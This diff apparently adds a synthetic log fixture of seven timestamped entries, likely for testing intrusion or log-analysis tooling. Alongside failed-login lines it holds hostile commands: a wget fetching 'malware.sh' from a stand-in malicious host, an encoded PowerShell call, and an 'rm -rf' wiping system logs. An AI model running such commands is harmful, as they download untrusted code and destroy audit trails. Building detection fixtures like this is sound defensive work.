@@ -1,0 +1,7 @@
+
+Jan 01 12:00:00 ERROR failed to connect to service
+Jan 01 12:00:01 authentication fail from 192.168.0.10
+Jan 01 12:00:02 user 'admin' failed login attempt
+Jan 01 12:00:03 wget http://malicious-site.com/malware.sh
+Jan 01 12:00:04 powershell -enc aGVsbG8gd29ybGQ=
+Jan 01 12:00:05 rm -rf /var/log/*
